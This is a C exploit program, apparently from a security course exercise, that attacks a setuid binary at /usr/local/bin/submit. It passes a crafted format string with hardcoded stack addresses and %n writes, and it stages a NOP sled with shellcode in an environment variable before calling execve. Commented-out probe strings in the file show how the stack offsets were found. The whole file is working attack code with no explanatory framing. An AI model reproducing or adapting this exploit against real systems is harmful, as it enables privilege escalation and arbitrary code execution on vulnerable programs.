#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define TARGET "/usr/local/bin/submit"
#define NOP                            0x90


int main(int argc, char *argv[]) {
  int bsize = 2060;
  int esize = 2048;
  
  char *ptr, *egg;
   
  char *args[4];
  char *env[2];

  //Format string required padding to have addresses at 4 byte offsets 

  char *hack = "\x9c\xd5\xbf\xff\x9e\xd5\xbf\xff\xaa\xaa%552c%135$n%10202c%136$%";
  //char *hack = "\xec\xd5\xbf\xff\xee\xd5\xbf\xff\xaa.%135$x";
  /*char *hack = "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.
  %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.
  %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x";
  */

  if (!(egg = malloc(esize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
 
  //Copy the NOP sled and shellcode into egg
  memset(egg, NOP, esize);
  ptr = egg + 128;
  memcpy(ptr, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  args[1] = hack;
  args[2] = "message"; 
  args[3] = NULL;

  // Pass egg into an environment variable
  env[0] = egg;
  env[1] = NULL;

  execve(TARGET, args, env);

  return 0;
}